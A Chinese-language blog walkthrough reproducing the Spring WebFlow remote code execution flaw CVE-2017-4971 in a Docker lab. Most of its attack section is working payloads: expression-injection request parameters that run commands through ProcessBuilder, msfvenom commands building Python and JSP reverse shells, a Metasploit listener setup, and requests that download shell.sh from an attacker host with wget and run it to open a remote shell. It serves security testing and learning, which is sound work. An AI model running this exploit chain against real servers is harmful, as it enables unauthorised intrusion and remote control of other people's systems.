### 作者: [smile-TT](http://blog.smilehacker.net/2017/07/18/%E7%8C%A5%E7%90%90%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)

#### 说明
在进行安全测试时，具备创新和非传统的思维方式至关重要。只有这样，才能发现并利用那些不显眼的漏洞。

### 1. 漏洞背景
该漏洞于六月份被提交，但官方迟迟未有回应，因此在安全社区中并未引起广泛关注。尽管漏洞分析报告已在三天前发布，但反响依然平平。我也是最近才得知这一情况，并通过一些非常规手段成功获取了反弹会话。

### 2. 漏洞发现及原因
Spring WebFlow 在模型数据绑定过程中存在一个严重问题：由于没有明确指定模型的具体属性，攻击者可以通过表单提交恶意表达式，从而导致任意代码执行。然而，复现此漏洞需要满足特定条件，包括版本限制以及某些默认配置。详细分析可参考[这篇漏洞分析文章](https://threathunter.org/topic/593d562353ab369c55425a90)。

### 3. 环境搭建
为了简化环境配置，推荐使用 Docker。相关镜像可在 [GitHub](https://github.com/Loneyers/vuldocker/tree/master/CVE-2017-4971) 上找到。以下为快速启动步骤：

```bash
git clone https://github.com/Loneyers/vuldocker.git
cd vuldocker/CVE-2017-4971
docker-compose build
docker-compose up -d
```

完成后，访问 `http://<ip>:30082` 即可开始测试。进入 Docker 容器终端以进一步操作：

```bash
docker ps
docker exec -it <container_id> /bin/bash
```

接下来，访问 `http://<ip>:30082/hotels/3` 并设置好代理，准备抓包。

点击“Confirm”后，在捕获的数据包中添加以下内容：

```bash
&_(new+java.lang.ProcessBuilder("touch","/tmp/success")).start()=iswin
```

即使返回错误信息也不必担心，直接检查 `/tmp` 目录下是否生成了 `success` 文件即可验证命令执行成功。

### 4. 创新思路

#### 思路一
尝试安装 Python 以便执行更复杂的命令：

```bash
apt-get install python
msfvenom -p cmd/unix/reverse_python lhost=192.168.12.106 lport=4444 -o shell.py
```

但由于双引号的存在，无法直接将 payload 添加到请求中，故需寻找其他方法。

#### 思路二
考虑到 Spring 与 JSP 的关联性，尝试使用 `wget` 下载并执行 JSP 马：

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.12.106 lport=4444 -o shell.jsp
mv shell.jsp /var/www/html/shell.jsp
service apache2 start
```

修改请求数据包：

```bash
&_(new+java.lang.ProcessBuilder("wget","http://192.168.12.106/shell.jsp")).start()=iswin
```

遗憾的是，上传路径未知且命令间不能包含空格，使得该方案难以实施。

#### 最终解决方案
结合 `wget` 和 Python 反弹 shell 的方法，编写一个 Shell 脚本：

```bash
msfvenom -p cmd/unix/reverse_python lhost=192.168.12.106 lport=4444 -o /var/www/html/shell.sh
```

Metasploit 设置监听：

```bash
use exploit/multi/handler
set payload cmd/unix/reverse_python
set lhost 192.168.12.106
set lport 4444
exploit
```

发送请求：

```bash
&_(new+java.lang.ProcessBuilder("wget","http://192.168.12.106/shell.sh")).start()=iswin
&_(new+java.lang.ProcessBuilder("/bin/bash","shell.sh")).start()=iswin
```

此时应能成功建立反弹会话。

### 5. 总结
尽管该漏洞不像 Struts 漏洞那样容易被发现或利用，但在特定条件下仍具有较大威胁。建议仅在授权范围内进行此类测试，避免对他人网站造成不必要的影响。此外，由于其苛刻的触发条件，预计受影响范围有限。